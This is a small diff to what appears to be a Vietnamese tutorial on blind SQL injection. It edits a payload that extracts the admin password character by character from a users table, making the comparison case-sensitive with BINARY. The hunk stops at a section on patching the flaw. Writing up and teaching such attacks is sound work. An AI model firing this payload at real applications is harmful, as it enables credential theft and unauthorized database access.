@@ -73,7 +73,7 @@ Ký tự thứ `i`:
 Dùng so sánh `>`/`<`/`=` để suy ra ASCII → ra ký tự.  
 Hoặc so sánh trực tiếp:
 ```
-' OR (SUBSTRING((SELECT password FROM users WHERE username='admin'), i, 1 )='F') -- -
+' OR (BINARY SUBSTRING((SELECT password FROM users WHERE username='admin'), i, 1 )='F') -- -
 ```
 
 ## Cách vá
